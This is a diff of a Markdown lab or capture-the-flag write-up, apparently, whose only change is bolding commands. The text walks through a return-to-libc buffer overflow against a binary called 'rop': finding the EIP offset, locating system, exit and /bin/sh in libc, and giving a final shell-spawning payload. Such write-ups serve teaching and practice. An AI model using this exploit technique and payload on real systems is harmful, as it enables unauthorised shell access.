@@ -237,7 +237,7 @@ Launching the rop program with gdb:
 Let's find the EIP offset by creating a large non repeating string which will lead to a segmentation fault.  
 
 On the attacker's machine:  
-./pattern_create.rb -l 100  
+**./pattern_create.rb -l 100**  
 <p align="center">
 <img width="412" alt="31" src="https://user-images.githubusercontent.com/21021400/144066117-e2472c9f-9a33-4d8a-b1b4-72a60a9c5d58.png">
 </p>
@@ -251,7 +251,7 @@ We get the following address:
 0x62413762  
 
 Searching the offset for that address:  
-./pattern_offset.rb -q 62413762 -l 100  
+**./pattern_offset.rb -q 62413762 -l 100**  
 <p align="center">
 <img width="174" alt="33" src="https://user-images.githubusercontent.com/21021400/144066123-941f5770-6d5f-4b25-959b-7f3380ac1d71.png">
 </p>
@@ -267,7 +267,7 @@ We get the address 0x42424242 which confirms we can overwrite the return address
 
 The buffer overflow in this case is "Return-to-libc", we will use functions from libc library.  
 First, we need to find the address of libc by using the command:  
-ldd rop  
+**ldd rop**  
 <p align="center">
 <img width="256" alt="35" src="https://user-images.githubusercontent.com/21021400/144066128-27a63df7-d02b-44d4-bb1e-9fe1f69ef21a.png">
 </p>
@@ -275,7 +275,7 @@ ldd rop
 libc base address: 0xb7e19000  
 
 Get system address:  
-readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system  
+**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system**  
 <p align="center">
 <img width="370" alt="36" src="https://user-images.githubusercontent.com/21021400/144066131-42fec910-7581-4028-a224-eb371afc793b.png">
 </p>
@@ -283,7 +283,7 @@ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
 system address: 0x0003ada0  
 
 Get exit address:  
-readelf -Ws /lib/i386-linux-gnu/libc.so.6 | grep exit  
+**readelf -Ws /lib/i386-linux-gnu/libc.so.6 | grep exit**  
 <p align="center">
 <img width="366" alt="37" src="https://user-images.githubusercontent.com/21021400/144066132-dfcf483f-3259-4408-8387-50fb9fafd28f.png">
 </p>
@@ -291,7 +291,7 @@ readelf -Ws /lib/i386-linux-gnu/libc.so.6 | grep exit
 exit address: 0x0002e9d0  
 
 Last thing we need is to find the offset to /bin/sh inside libc using the command:  
-strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh  
+**strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh**  
 <p align="center">
 <img width="384" alt="38" src="https://user-images.githubusercontent.com/21021400/144066135-3155223d-5e4d-421a-b541-ee2b08ebc314.png">
 </p>
@@ -305,15 +305,15 @@ Calculating fixed addresses from the libc base address:
 </p>
 
 system  
-python -c "print('system', hex(0xb7e19000 + 0x0003ada0))"  
+**python -c "print('system', hex(0xb7e19000 + 0x0003ada0))"**  
 0xb7e53da0  
 
 exit  
-python -c "print('exit', hex(0xb7e19000 + 0x0002e9d0))"  
+**python -c "print('exit', hex(0xb7e19000 + 0x0002e9d0))"**  
 0xb7e479d0  
 
 /bin/sh  
-python -c "print('/bin/sh', hex(0xb7e19000 + 0x0015ba0b))"  
+**python -c "print('/bin/sh', hex(0xb7e19000 + 0x0015ba0b))"**  
 0xb7f74a0b  
 
 Our payload is: Buffer + Address_of_System + Address_of_Exit + Address_of_/bin/sh  
@@ -324,7 +324,7 @@ Exit: 0xb7e479d0 => \xd0\x79\xe4\xb7
 /bin/sh: 0xb7f74a0b => \x0b\x4a\xf7\xb7  
 
 
-The final payload is: ./rop $(python -c 'print("A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')  
+The final payload is: **./rop $(python -c 'print("A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')**  
 <p align="center">
 <img width="538" alt="40" src="https://user-images.githubusercontent.com/21021400/144066140-dabc3037-14aa-449a-829d-cc99e3f7cb24.png">
 </p>
